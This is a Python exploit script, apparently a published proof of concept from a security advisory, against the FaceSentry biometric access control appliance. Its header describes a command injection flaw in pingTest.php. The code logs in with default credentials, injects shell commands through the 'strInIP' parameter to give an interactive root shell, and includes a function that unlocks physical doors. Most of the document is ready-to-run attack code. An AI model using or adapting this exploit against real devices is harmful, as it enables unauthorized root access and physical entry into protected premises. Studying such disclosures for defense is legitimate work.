# -*- coding: utf-8 -*-
#
#
# FaceSentry Access Control System 6.4.8 Remote Root Exploit
#
#
# Vendor: iWT Ltd.
# Product web page: http://www.iwt.com.hk
# Affected version: Firmware 6.4.8 build 264 (Algorithm A16)
#                   Firmware 5.7.2 build 568 (Algorithm A14)
#                   Firmware 5.7.0 build 539 (Algorithm A14)
#
# Summary: FaceSentry 5AN is a revolutionary smart identity
# management appliance that offers entry via biometric face
# identification, contactless smart card, staff ID, or QR-code.
# The QR-code upgrade allows you to share an eKey with guests
# while you&#039;re away from your Office and monitor all activity
# via the web administration tool. Powered by standard PoE
# (Power over Ethernet), FaceSEntry 5AN can be installed in
# minutes with only 6 screws. FaceSentry 5AN is a true enterprise
# grade access control or time-and-attendance appliance.
#
# Desc: FaceSentry suffers from an authenticated OS command
# injection vulnerability using default credentials. This can
# be exploited to inject and execute arbitrary shell commands
# as the root user via the &#039;strInIP&#039; POST parameter in pingTest
# PHP script.
#
# ==============================================================
# /pingTest.php:
# --------------
# 8:  if (!isAuth(&#039;TestTools&#039;,&#039;R&#039;)){
# 9:      echo "No Permission";
# 10:     include("footer.php");
# 11:     exit;
# 12:  }
# 13:
# 14: if(isset($_POST["strInIP"])){
# 15:     $strInIP = $_POST["strInIP"];
# 16: }else{
# 17:     $strInIP = "";
# 18: }
# 19:
# 20: $strOperationResult = "";
# 21: if ($strInIP != ""){
# 22:
# 23:    $out = array(); 
# 24:    exec("sudo ping -c 4 $strInIP",$out);
# 25:    $result = "";    
# 26:    foreach($out as $line){
# 27:        $result = $result.$line."<br>";        
# 28:    }
# ==============================================================
#
# Tested on: Linux 4.14.18-sunxi (armv7l) Ubuntu 16.04.4 LTS (Xenial Xerus)
#            Linux 3.4.113-sun8i (armv7l)
#            PHP/7.0.30-0ubuntu0.16.04.1
#            PHP/7.0.22-0ubuntu0.16.04.1
#            lighttpd/1.4.35
#            Armbian 5.38
#            Sunxi Linux (sun8i generation)
#            Orange Pi PC +
#
#
# Vulnerability discovered by Gjoko &#039;LiquidWorm&#039; Krstic
#                             @zeroscience
#
#
# Advisory ID: ZSL-2019-5525
# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5525.php
#
#
# 28.05.2019
#

import datetime########INITIALIZE
import urllib2#########BIOMETRICS
import urllib##########FACIAL.REC
import time############OGNITION.S
import sys##(.)###(.)##YSTEM.DOOR
import re#######O######UNLOCKED.A
import os#######_######CCESS.GRAN
import io######(_)#####TED.0B1000
import py##############1.11111011

from cookielib import CookieJar

global pajton
pajton = os.path.basename(sys.argv[0])

def usage():
    if len(sys.argv) < 2:
        print &#039;[+] Usage: ./&#039; + pajton + &#039; <ip>\n&#039;
        sys.exit()

def auth():
    brojac = 0
    usernames = [ &#039;admin&#039;, &#039;user&#039;, &#039;administrator&#039; ] # case sensitive
    passwords = [ &#039;123&#039;, &#039;123&#039;, &#039;123456&#039; ]
    while brojac < 3:
        podatoci = { &#039;strInLogin&#039;    : usernames[brojac],
                     &#039;strInPassword&#039; : passwords[brojac],
                     &#039;saveLogin&#039;     : &#039;1&#039;,
                     &#039;saveFor&#039;       : &#039;168&#039; } # 7 days
        print &#039;[+] Trying creds &#039; + usernames[brojac] + &#039;:&#039; + passwords[brojac]
        nesto_encode = urllib.urlencode(podatoci)
        ajde.open(&#039;http://&#039; + target + &#039;/login.php&#039;, nesto_encode)
        check = ajde.open(&#039;http://&#039; + target + &#039;/sentryInfo.php&#039;)
        dool = re.search(r&#039;Hardware Key&#039;, check.read())
        if dool:
            print &#039;[+] That worked!&#039;
            break
        else:
            brojac += 1
            if brojac == 3:
                print &#039;[!] Ah ah ah. You didn\&#039;t say the magic word!&#039;
                sys.exit()

def door():
    unlock = raw_input(&#039;[*] Unlock door No.: &#039;) # default door number = 0
    try:
        br = int(unlock)
        panel = { &#039;strInAction&#039;           : &#039;openDoor&#039;,
                  &#039;strInPanelNo&#039;          : br,
                  &#039;strInRestartAction&#039;    : &#039;&#039;,
                  &#039;strPanelIDRestart&#039;     : &#039;&#039;,
                  &#039;strPanelRestartAction&#039; : &#039;&#039; }
        nesto_encode = urllib.urlencode(panel)
        ajde.open(&#039;http://&#039; + target + &#039;/openDoor.php&#039;, nesto_encode)
        print &#039;[+] Door &#039; + unlock + &#039; is unlocked!&#039;
    except ValueError:
        print &#039;[!] Only values from 0 to 8 are valid.&#039;
        door()

def main():
    if os.name == &#039;posix&#039;:
        os.system(&#039;clear&#039;)
    if os.name == &#039;nt&#039;:
        os.system(&#039;cls&#039;)

    vremetodeneska = datetime.datetime.now()
    kd = vremetodeneska.strftime(&#039;%d.%m.%Y %H:%M:%S&#039;)
    print &#039;Starting exploit at &#039; + kd

    print &#039;&#039;&#039;
──────────────────────────────────
──FaceSentry Access Control System
────────Remote Root Exploit
─────────Zero Science Lab
────────www.zeroscience.mk
───────────ZSL-2019-5525
─────────────▄▄▄▄▄▄▄▄▄
─────────────▌▐░▀░▀░▀▐
─────────────▌░▌░░░░░▐
─────────────▌░░░░░░░▐
─────────────▄▄▄▄▄▄▄▄▄
───────▄▀▀▀▀▀▌▄█▄░▄█▄▐▀▀▀▀▀▄
──────█▒▒▒▒▒▐░░░░▄░░░░▌▒▒▒▒▒█
─────▐▒▒▒▒▒▒▒▌░░░░░░░▐▒▒▒▒▒▒▒▌
─────▐▒▒▒▒▒▒▒█░▀▀▀▀▀░█▒▒▒▒▒▒▒▌
─────▐▒▒▒▒▒▒▒▒█▄▄▄▄▄█▒▒▒▒▒▒▒▒▌
─────▐▒▒▒▒▐▒▒▒▒▒▒▒▒▒▒▒▒▐▒▒▒▒▒▌
─────▐▒▒▒▒▒█▒▒▒▒▒▒▒▒▒▒▒█▒▒▒▒▒▌
─────▐▒▒▒▒▒▐▒▒▒▒▒▒▒▒▒▒▒▌▒▒▒▒▒▌
─────▐▒▒▒▒▒▒▌▒▒▒▒▒▒▒▒▒▐▒▒▒▒▒▒▌
─────▐▒▒▒▒▒▒▌▄▄▄▄▄▄▄▄▄▐▒▒▒▒▒▒▌
─────▐▄▄▄▄▄▄▌▌███████▌▐▄▄▄▄▄▄▌
──────█▀▀▀▀█─▌███▌███▌─█▀▀▀▀█
──────▐░░░░▌─▌███▌███▌─▐░░░░▌
───────▀▀▀▀──▌███▌███▌──▀▀▀▀
─────────────▌███▌███▌
─────────────▌███▌███▌
───────────▐▀▀▀██▌█▀▀▀▌
▒▒▒▒▒▒▒▒▒▒▒▐▄▄▄▄▄▄▄▄▄▄▌▒▒▒▒▒▒▒▒▒▒▒
    &#039;&#039;&#039;

    usage()
    tegla = CookieJar()
    global ajde, target
    target = sys.argv[1]
    ajde = urllib2.build_opener(urllib2.HTTPCookieProcessor(tegla))
    auth()
    raw_input(&#039;\n[*] Press [ENTER] to land... &#039;)

    print &#039;[+] Entering interactive (web)shell...&#039;
    time.sleep(1)
    print

    while True:
        try:
            cmd = raw_input(&#039;root@facesentry:~# &#039;)
            if &#039;exit&#039; in cmd.strip():
                print &#039;[+] Take care now, bye bye then!&#039;
                break
            if &#039;door&#039; in cmd.strip():
                door()
                continue
            podatoci = { &#039;strInIP&#039; : &#039;;sudo &#039; + cmd } # |cmd
            nesto_encode = urllib.urlencode(podatoci)
            r_izraz = ajde.open(&#039;http://&#039; + target + &#039;/pingTest.php?&#039;, nesto_encode)
            pattern = re.search(cmd+&#039;\)<[^>]*>(.*?)</font>&#039;, r_izraz.read())
            x = pattern.groups()[0].strip()
            y = x.replace(&#039;<br>&#039;, &#039;\n&#039;)
            print y.strip()
        except Exception as i:
            print &#039;[-] Error: &#039; + i.message
            pass
        except KeyboardInterrupt as k:
            print &#039;\n[+] Interrupter!&#039;
            sys.exit()

    sys.exit()

if __name__ == "__main__":
    main()

